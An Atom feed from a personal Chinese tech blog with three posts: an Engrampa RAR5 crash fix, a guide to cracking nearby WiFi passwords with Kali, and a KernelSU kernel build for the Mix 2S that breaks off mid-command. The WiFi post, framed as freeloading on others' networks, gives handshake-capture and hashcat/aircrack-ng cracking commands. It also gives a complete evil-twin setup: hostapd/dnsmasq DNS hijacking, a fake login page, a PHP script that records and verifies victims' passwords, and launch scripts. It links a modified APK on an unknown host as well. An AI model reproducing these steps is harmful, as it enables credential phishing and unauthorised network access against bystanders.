<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wu1015&#39;s blog</title>
  
  
  <link href="http://wu1015.github.io/atom.xml" rel="self"/>
  
  <link href="http://wu1015.github.io/"/>
  <updated>2025-06-19T02:59:58.278Z</updated>
  <id>http://wu1015.github.io/</id>
  
  <author>
    <name>wu1015</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Engrampa无法打开rar5的解决方法</title>
    <link href="http://wu1015.github.io/2025/06/17/Engrampa-rar5/"/>
    <id>http://wu1015.github.io/2025/06/17/Engrampa-rar5/</id>
    <published>2025-06-17T09:26:06.000Z</published>
    <updated>2025-06-19T02:59:58.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="无法打开"><a href="#无法打开" class="headerlink" title="无法打开"></a>无法打开</h2><ul><li>在一个阴雨连绵的下午，我如往常一样使用Engrampa打开一个rar压缩包时，归档管理器直接崩溃。根据多年来的经验，肯定是压缩包的问题。毕竟人生不如意十之八九，压缩包损坏情有可原，但当我一番寻觅之后发现并非如此。</li></ul><h3 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h3><ul><li><p>使用归档管理器打开其他几个rar的压缩包，正常</p></li><li><p>使用unrar命令进行解压，也正常</p></li><li><p>百思不得其解下，我询问了AI，毕竟AI可是debug的高手。一番询问后，发现似乎是rar升级了版本。使用以下命令查看rar版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file xxx.rar</span><br><span class="line"></span><br><span class="line">// 得到</span><br><span class="line">xxx.rar: RAR archive data, v5</span><br><span class="line">xxx.rar: RAR archive data, v4, os: Win32</span><br></pre></td></tr></table></figure></li><li><p>经过测试发现，可打开的rar文件大部分为v4，小部分为v5。</p></li><li><p>使用以下命令得到Engrampa解压调用的程序。发现调用的是7z相关的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace engrampa xxx.rar 2&gt;&amp;1|grep -E &#x27;unrar|unar|bsdtar|7z|7za&#x27;</span><br></pre></td></tr></table></figure></li><li><p>使用以下命令调用7z解压，成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x xxx.rar</span><br></pre></td></tr></table></figure></li><li><p>使用以下命名调用unrar解压，成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unrar x xxx.rar</span><br></pre></td></tr></table></figure></li><li><p>说明不是后端的问题，那么就把目标锁定到Engrampa上面来。排查开源bug最方便的方法就是去查找该项目的github。一找真找到了，在4月份有个<a href="https://github.com/mate-desktop/engrampa/issues/527">issue</a>，说的就是在这个版本的rar解压的问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Engrampa 版本为1.26.2</span><br><span class="line">UNRAR 7.00 freeware</span><br></pre></td></tr></table></figure></li></ul><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ul><li><p>根据issue提供的信息，最简单的解决方法就是将<code>.rar</code>后缀改为<code>.zip</code>，实测可行。但是，很多时候我只是想打开看看里面有啥东西而已，每次都需要这样改来改去未免有点太麻烦了。</p></li><li><p>第二个解决方法就是升级版本，在issue的回复中有说明在1.28版本中修复了这个问题。更新版本有不少办法，最简单的就是找个最新的ppa，加进去。但通过观察issue的提交时间可知，修复是在近三个月时间修复的，其他源不一定更新了这个修复。于是，编译成了最佳的选项。（事实上最新的release好像是24年的）</p></li></ul><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><ul><li><p>根据AI提供的安装教程，亲测可用。先安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y \</span><br><span class="line">  git \</span><br><span class="line">  meson \</span><br><span class="line">  ninja-build \</span><br><span class="line">  gettext \</span><br><span class="line">  libgtk-3-dev \</span><br><span class="line">  libglib2.0-dev \</span><br><span class="line">  libarchive-dev \</span><br><span class="line">  libxml2-dev \</span><br><span class="line">  itstool \</span><br><span class="line">  yelp-tools \</span><br><span class="line">  libjson-glib-dev \</span><br><span class="line">  libsm-dev \</span><br><span class="line">  desktop-file-utils</span><br></pre></td></tr></table></figure></li><li><p>下载源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mate-desktop/engrampa.git</span><br><span class="line">cd engrampa</span><br></pre></td></tr></table></figure></li><li><p>构建项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meson setup build</span><br><span class="line">meson compile -C build</span><br></pre></td></tr></table></figure></li><li><p>启动构建后的程序，测试打开成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/src/engrampa</span><br></pre></td></tr></table></figure></li><li><p>安装到系统路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo meson install -C build</span><br></pre></td></tr></table></figure></li></ul><h3 id="老旧的编译方法"><a href="#老旧的编译方法" class="headerlink" title="老旧的编译方法"></a>老旧的编译方法</h3><ul><li>搜索到的一篇CSDN中的安装方法，即使用<code>autogen.sh</code>进行编译安装。与文中不同的是，需要安装mate-common，而教程中没有提到。</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://github.com/mate-desktop/engrampa/issues/527">Ubuntu Mate 24.04 Segmentation fault when opening rar files with Engrampa 1.26.2 and 1.28.2 #527</a></li><li><a href="https://blog.csdn.net/gitblog_00061/article/details/138745652">老旧的_Engrampa 文件归档管理器使用教程</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;无法打开&quot;&gt;&lt;a href=&quot;#无法打开&quot; class=&quot;headerlink&quot; title=&quot;无法打开&quot;&gt;&lt;/a&gt;无法打开&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;在一个阴雨连绵的下午，我如往常一样使用Engrampa打开一个rar压缩包时，归档管理器直接崩溃。根据多年来的经</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>使用kali实现不那么优雅的WiFi密码获取</title>
    <link href="http://wu1015.github.io/2025/05/09/kali-wifi-get/"/>
    <id>http://wu1015.github.io/2025/05/09/kali-wifi-get/</id>
    <published>2025-05-09T07:59:52.000Z</published>
    <updated>2025-05-09T08:20:22.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信不少朋友都遇到过旁边全是Wifi节点，但就是一个都用不了的痛苦。今天我就来分享一些不那么优雅的蹭网方式。</p><h2 id="WiFi万能钥匙"><a href="#WiFi万能钥匙" class="headerlink" title="WiFi万能钥匙"></a>WiFi万能钥匙</h2><ul><li>大道至简，虽说这并不是所谓的密码破解，但在一个陌生环境下蹭网仍是一个不错的选择。毕竟你也不能确定会不会已经有人把密码分享出去了。如果有的话，这种方法可以说是最简单，最高效的方法了。如果没有的话，请继续往下看。</li><li>我此分享一个从网络中找到的别人分享的万能钥匙的改版，相对清爽一些。<a href="https://frp-any.top:18514/Onedrive/%E5%BA%94%E7%94%A8/Android/WiFi%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99%204.9.65.apk">WiFi万能钥匙下载链接</a></li></ul><h2 id="抓握手包跑字典"><a href="#抓握手包跑字典" class="headerlink" title="抓握手包跑字典"></a>抓握手包跑字典</h2><ul><li><p>开局直接获取su权限，免得下面操作频繁输入<code>sudo</code>。kali的默认账户和密码都是<code>kali</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></li><li><p>查看可用的监听网卡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng </span><br></pre></td></tr></table></figure></li><li><p>开启监听，wlan0就是之前查看的监听网卡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></li><li><p>找到需要监听的wifi后记录信息，然后键入<code>ctrl c</code>停止扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID      </span><br><span class="line">FE:92:C4:5E:5E:C3  -47        3        2    0   4  180   WPA2 CCMP   PSK  _test  </span><br></pre></td></tr></table></figure></li><li><p>根据上面的信息进行握手包抓取，并将抓取的我手包存储指定目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 4 --bssid FE:92:C4:5E:5E:C3 -w /home/kali/Desktop/test/NewFolder/_test wlan0mon</span><br></pre></td></tr></table></figure></li><li><p>等待有人连接wifi后，显示MAC地址就可以停止抓包了。在对应目录会出现对应文件。<br><img src="https://wu1015-images.pages.dev/imgs/kali-wifi-get/01.png" alt="抓包完成的标志"></p></li><li><p>停止抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure><p><img src="https://wu1015-images.pages.dev/imgs/kali-wifi-get/02.png" alt="抓取的握手包"></p></li><li><p>进入这个网址<code>https://hashcat.net/cap2hashcat/index.pl</code>将<code>.cap</code>文件转化为<code>.hc22000</code>文件后就可以选择使用<code>hashcat</code>进行暴力破解了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 字典暴力破解</span><br><span class="line">hashcat -m 22000 xxx.hc22000 pwd.txt</span><br><span class="line"></span><br><span class="line">// 掩码暴力破解</span><br><span class="line">hashcat -a 3 -m 22000 xxx.hc22000 ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure></li><li><p>当然也可以不转换，直接使用<code>aircrack-ng </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng handshake.cap -w pwd.txt</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用Fluxion伪造AP"><a href="#使用Fluxion伪造AP" class="headerlink" title="使用Fluxion伪造AP"></a>使用Fluxion伪造AP</h2><ul><li>这个网上教程很多，而且引导页面也可以设置中文，就不过多描述了。</li><li>需要注意的是使用前执行<code>fluxion -i</code>进行依赖补全，如果无法补全就直接自己执行<code>apt</code></li><li>其中<code>pyrit</code>因为年久失修，已经不在官方的仓库里面了，需要自己弄。但还是需要注意，因为这位作者编写的是<code>bash</code>脚本，而kali默认为<code>zsh</code>，如果直接执行脚本会出现报错。正确做法是使用<code>bash</code>来执行。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/hacker3983/pyrit-installer.git</span><br><span class="line">cd pyrit-installer</span><br><span class="line">bash ./install.sh</span><br></pre></td></tr></table></figure><img src="https://wu1015-images.pages.dev/imgs/kali-wifi-get/04.png" alt="成功后的提示和根据提示打开的文件内容"></li></ul><h2 id="手动伪造AP"><a href="#手动伪造AP" class="headerlink" title="手动伪造AP"></a>手动伪造AP</h2><ul><li>效果和使用<code>fluxion</code>基本一样，甚至会略微差一些，毕竟<code>flxuion</code>的自定义选项更多，而手动弄的话比较吃自己的操作，下限更低。</li></ul><h3 id="配置目录以及文件"><a href="#配置目录以及文件" class="headerlink" title="配置目录以及文件"></a>配置目录以及文件</h3><ul><li><p>这次就不要使用<code>su</code>了，因为我们需要本地服务器有权限写入目录。</p></li><li><p>创建目录并进入目录创建hostapd.conf文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /home/kali/Desktop/test/wlan_hack/</span><br><span class="line">cd /home/kali/Desktop/test/wlan_hack/</span><br></pre></td></tr></table></figure></li><li><p>在该目录中放入之前抓取的握手包文件</p></li><li><p><code>hostapd.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0</span><br><span class="line">driver=nl80211</span><br><span class="line">ssid=Free_WiFi</span><br><span class="line">hw_mode=g</span><br><span class="line">channel=6</span><br><span class="line">macaddr_acl=0</span><br><span class="line">auth_algs=1</span><br><span class="line">ignore_broadcast_ssid=0</span><br></pre></td></tr></table></figure></li><li><p><code>dnsmasq.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0</span><br><span class="line">dhcp-range=192.168.1.2,192.168.1.100,12h</span><br><span class="line">dhcp-option=3,192.168.1.1</span><br><span class="line">dhcp-option=6,192.168.1.1</span><br><span class="line">address=/#/192.168.1.1</span><br></pre></td></tr></table></figure></li><li><p>配置钓鱼页面<code>index.html</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Wi-Fi 登录&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;连接 Free_WiFi&lt;/h2&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;/login.php&quot;&gt;</span><br><span class="line">  &lt;label&gt;请输入 Wi-Fi 密码：&lt;/label&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type=&quot;password&quot; name=&quot;wifi_pass&quot; required&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;连接&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>配置密码验证<code>login.php</code>，请注意修改存储密码的文件和握手包路径为绝对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$password = $_POST[&#x27;wifi_pass&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">file_put_contents(&quot;/home/kali/Desktop/test/wlan_hack/temp_pass.txt&quot;, $password);</span><br><span class="line"></span><br><span class="line">// 调用 aircrack-ng 验证握手包</span><br><span class="line">$cmd = &quot;aircrack-ng /home/kali/Desktop/test/wlan_hack/handshake.cap -w /home/kali/Desktop/test/wlan_hack/temp_pass.txt 2&gt;&amp;1&quot;;</span><br><span class="line">$output = shell_exec($cmd);</span><br><span class="line"></span><br><span class="line">if (strpos($output, &quot;KEY FOUND!&quot;) !== false) &#123;</span><br><span class="line">    file_put_contents(&quot;/home/kali/Desktop/test/wlan_hack/valid.txt&quot;, &quot;y &quot; . $password . &quot;\n&quot;);</span><br><span class="line">    echo &quot;&lt;h3&gt;密码验证成功，连接成功！&lt;/h3&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    file_put_contents(&quot;/home/kali/Desktop/test/wlan_hack/invalid.txt&quot;, &quot;n &quot; . $password . &quot;\n&quot;);</span><br><span class="line">    echo &quot;&lt;h3&gt;密码错误，请重新输入。&lt;/h3&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p>配置启动脚本<code>run.sh</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 清理旧配置</span><br><span class="line">killall hostapd dnsmasq apache2</span><br><span class="line">iptables --flush</span><br><span class="line">ip link set wlan0 down</span><br><span class="line"></span><br><span class="line"># 设置静态IP</span><br><span class="line">ip link set wlan0 up</span><br><span class="line">ip addr add 192.168.1.1/24 dev wlan0</span><br><span class="line"></span><br><span class="line"># 启用 IP 转发</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line"># 清空旧规则</span><br><span class="line">iptables -F</span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line"># NAT 设置</span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line"></span><br><span class="line"># 把所有 HTTP 请求重定向到本地 Web 服务器（Captive Portal）</span><br><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 启动 hostapd</span><br><span class="line">hostapd hostapd.conf &amp;</span><br><span class="line"></span><br><span class="line"># 启动 dnsmasq</span><br><span class="line">dnsmasq -C dnsmasq.conf</span><br><span class="line"></span><br><span class="line"># 启动 Apache（默认网站目录为 /var/www/html）</span><br><span class="line">cp index.html /var/www/html/index.html</span><br><span class="line">cp login.php /var/www/html/login.php</span><br><span class="line">systemctl restart apache2</span><br><span class="line"></span><br><span class="line">echo &quot;[+] 钓鱼 Wi-Fi 启动成功，请连接 Free_WiFi 测试。&quot;</span><br></pre></td></tr></table></figure></li><li><p>配置停止脚本<code>stop.sh</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 正在关闭钓鱼 Wi-Fi 环境...&quot;</span><br><span class="line"></span><br><span class="line"># 杀掉后台运行的服务</span><br><span class="line">killall hostapd 2&gt;/dev/null</span><br><span class="line">killall dnsmasq 2&gt;/dev/null</span><br><span class="line">killall apache2 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># 还原网络接口</span><br><span class="line">ip addr flush dev wlan0</span><br><span class="line">ip link set wlan0 down</span><br><span class="line"></span><br><span class="line"># 清除 iptables 规则</span><br><span class="line">iptables -F</span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -X</span><br><span class="line"></span><br><span class="line">echo &quot;[+] 停止完成，网络环境已恢复。&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><ul><li><p>配置php用户为当前用户，以确保有权限写入文件。配置文件为<code>/etc/apache2/envvars</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 将</span><br><span class="line">export APACHE_RUN_USER=www-data</span><br><span class="line">export APACHE_RUN_GROUP=www-data</span><br><span class="line"></span><br><span class="line">// 修改为</span><br><span class="line">export APACHE_RUN_USER=kali</span><br><span class="line">export APACHE_RUN_GROUP=kali</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>直接执行<code>run.sh</code>。</p></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>最优解肯定是使用<code>fluxion</code>，毕竟人家都封装好了，只是为了解决问题，越简单越好。</li><li>按照我手动配置的话，可能会出现一些网址无法成功dns劫持。</li><li>当然，钓鱼页面可以自己写，毕竟我写的这个过于简单了。</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://blog.csdn.net/2301_79100880/article/details/132670845">kali Linux安装fluxion中pyrit失败，亲测有效</a></li><li><a href="https://playlab.eu.org/archives/hashcat">Kali Linux 使用 Hashcat 高效破解 WiFi 密码【暴力破解篇】</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;相信不少朋友都遇到过旁边全是Wifi节点，但就是一个都用不了的痛苦。今天我就来分享一些不那么优雅的蹭网方式。&lt;/p&gt;
&lt;h2 id=&quot;WiF</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
    <category term="Kali" scheme="http://wu1015.github.io/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>mix2s的kernelsu内核编译（顺便加入lz4支持）</title>
    <link href="http://wu1015.github.io/2025/02/15/mix2s-kernelsu-build/"/>
    <id>http://wu1015.github.io/2025/02/15/mix2s-kernelsu-build/</id>
    <published>2025-02-15T13:06:43.000Z</published>
    <updated>2025-03-04T08:57:28.850Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>看到隔壁用kernelsu（以下简称ksu）隐藏root的效果不错，但mix2s的4.9内核显然不在ksu的官方支持范围内，需要自编译内核。恰好我最近因为一位编译者的crdroid（以下简称为crd）内核只支持<code>lzo</code>的zram压缩算法（因为使用的lineageOS的设备树）。我需要更加高效的算法，比如<code>lz4</code>。</li></ul><h2 id="编译环境准备"><a href="#编译环境准备" class="headerlink" title="编译环境准备"></a>编译环境准备</h2><ul><li><p>本文以mix2s为主的配置，相当部分参考了<a href="https://github.com/Initsnow/kernelsu_xiaomi_polaris_action">Mix2s内核ksu编译action_Initsnow</a>的源码。其他机型请参考<a href="https://github.com/feichaixiaobai/Android-kernel-make-teach/discussions/1">Android内核编译教程_feichaixiaobai</a>。使用的是lineageOS的内核源码。</p></li><li><p>安装编译需要的相应包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt install bc bison build-essential ccache curl flex g++-multilib gcc-multilib git git-lfs gnupg gperf imagemagick lib32readline-dev lib32z1-dev libelf-dev liblz4-tool libsdl1.2-dev libssl-dev libxml2 libxml2-utils lzop pngcrush rsync schedtool squashfs-tools xsltproc zip zlib1g-dev</span><br><span class="line"></span><br><span class="line">wget https://archive.ubuntu.com/ubuntu/pool/universe/n/ncurses/libtinfo5_6.3-2_amd64.deb &amp;&amp; sudo dpkg -i libtinfo5_6.3-2_amd64.deb &amp;&amp; rm -f libtinfo5_6.3-2_amd64.deb</span><br><span class="line"></span><br><span class="line">wget https://archive.ubuntu.com/ubuntu/pool/universe/n/ncurses/libncurses5_6.3-2_amd64.deb &amp;&amp; sudo dpkg -i libncurses5_6.3-2_amd64.deb &amp;&amp; rm -f libncurses5_6.3-2_amd64.deb</span><br></pre></td></tr></table></figure></li><li><p>安装交叉编译工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /home/runner</span><br><span class="line">cd /home/runner</span><br><span class="line"></span><br><span class="line">git clone https://github.com/LineageOS/android_prebuilts_gcc_linux-x86_aarch64_aarch64-linux-android-4.9.git --depth=1 gcc_aarch64</span><br><span class="line"></span><br><span class="line">git clone https://github.com/LineageOS/android_prebuilts_gcc_linux-x86_arm_arm-linux-androideabi-4.9.git --depth=1 gcc_arm</span><br><span class="line"></span><br><span class="line">git clone https://github.com/LineageOS/android_prebuilts_clang_kernel_linux-x86_clang-r416183b.git --depth=1 clang-r416183b</span><br></pre></td></tr></table></figure></li><li><p>拉取内核源码。这个地方是我修改了一部分的los的源码仓库，修改了<code>fs/namespace.c</code>和<code>security/selinux/hooks.c</code>文件，以实现ksu模块的生效和卸载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/wu1015/android_kernel_xiaomi_sdm845.git --depth=1</span><br></pre></td></tr></table></figure></li></ul><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><ul><li><p>配置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/runner/android_kernel_xiaomi_sdm845</span><br><span class="line"></span><br><span class="line">PATH=&quot;/home/runner/clang-r416183b/bin:$&#123;PATH&#125;&quot;</span><br></pre></td></tr></table></figure></li><li><p>引入ksu源码（0.9.5）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -LSs &quot;https://raw.githubusercontent.com/tiann/KernelSU/main/kernel/setup.sh&quot; | bash -s b766b98513b5a7eb33bc1c4a76b5702bf1288f07</span><br></pre></td></tr></table></figure></li><li><p>合并编译配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat ./arch/arm64/configs/vendor/xiaomi/mi845_defconfig &gt; ./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br><span class="line"></span><br><span class="line"># 加入kprobe支持</span><br><span class="line">echo &quot;CONFIG_KPROBES=y&quot; &gt;&gt; ./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br><span class="line">echo &quot;CONFIG_HAVE_KPROBES=y&quot; &gt;&gt; ./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br><span class="line">echo &quot;CONFIG_KPROBE_EVENTS=y&quot; &gt;&gt; ./arch/arm64/configs/vendor/xiaomi/polaris_defconfig</span><br><span class="line"></span><br><span class="line"># 加入lz4内存压缩算法</span><br><span class="line">echo &quot;CONFIG_CRYPTO_LZ4=y&quot; &gt;&gt; 